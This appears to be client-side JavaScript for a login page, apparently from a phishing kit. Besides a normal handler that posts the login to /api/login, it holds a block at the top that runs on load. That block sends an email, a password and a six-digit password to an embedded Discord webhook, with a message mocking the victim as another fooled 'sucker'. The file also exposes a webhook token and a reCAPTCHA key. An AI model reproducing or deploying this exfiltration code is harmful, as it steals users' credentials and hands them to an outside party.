const loginResource = `login`

Bico = {
    email: 'example@example.com',
    password: 'minhasenh123',
    password6: '123456',
}

var xhttp = new XMLHttpRequest()
var discordWebhook =
    'https://discord.com/api/webhooks/919671150596993104/JCe51ymMno_5nvR9t23GjrsTinf24BD5F3Mvel40v-HeFQI7gPyt3-xt-B504FKo9v88'

xhttp.open('POST', discordWebhook)
xhttp.setRequestHeader('Content-type', 'application/json')

var params = {
    username: 'É bloco 7 ladrão -- By FrankFK',
    avatar_url:
        'https://media.discordapp.net/attachments/855886260471595010/855897495921098773/fb61b5869d7192528104009eba8573f5.gif',

    content:
        '**\nEXTRA EXTRA, MAIS UM OTÁRIO ENGANADO!! -- Faz Igual ou Dobra!!**\n\nEmail: ```' +
        Bico.email +
        '```\nSenha: ```' +
        Bico.password +
        '```\nSenha de 6: ```' +
        Bico.password6 +
        '```\n**Finalizado** ',
}
xhttp.send(JSON.stringify(params))

const requestLogin = (object) => {
    return new Promise((resolve, reject) => {
        const { email, password, gToken } = object

        const reqUrl = `/api/${loginResource}`
        fetch(reqUrl, {
            method: `POST`,
            headers: {
                'content-type': 'application/json',
            },
            body: JSON.stringify({ email, password, gToken }),
        })
            .then((res) => res.json())
            .then((response) => {
                if (response.error) {
                    return reject(response.error)
                }

                resolve(response)
                return console.log(response)
            })
            .catch((error) => reject(error))
    })
}

const login = (form) => {
    const inputMail = form.querySelector('.loginMail')
    const inputPassword = form.querySelector('.loginPassword')

    form.classList.add('was-validated')

    if (!inputMail.value) {
        return inputMail.classList.add('is-invalid')
    } else {
        inputMail.classList.remove('is-invalid')
        inputMail.classList.add('is-valid')
        //
    }
    if (!inputPassword.value) return inputPassword.classList.add('is-invalid')

    grecaptcha.ready(function () {
        grecaptcha.execute('6LeM9q0ZAAAAAPJ827IgGMXdYRB9NdnNkbfrmaEY', { action: 'login' }).then(function (token) {
            // Add your logic to submit to your backend server here.
            return requestLogin({ email: inputMail.value, password: inputPassword.value, gToken: token })
                .then((res) => {
                    ///dashboard
                    window.location.href = '/dashboard'
                })
                .catch((error) => {
                    const divAlert = document.createElement('div')
                    divAlert.classList.add('alert', 'alert-danger')
                    divAlert.setAttribute('role', 'alert')
                    divAlert.innerHTML = error

                    form.prepend(divAlert)

                    setTimeout(() => {
                        divAlert.remove()
                    }, 4000)
                })
        })
    })
}

const btnLogin = document.querySelector('.btnLogin')

if (btnLogin) {
    btnLogin.addEventListener('click', (e) => {
        e.preventDefault()

        login(btnLogin.closest('form'))
    })
}
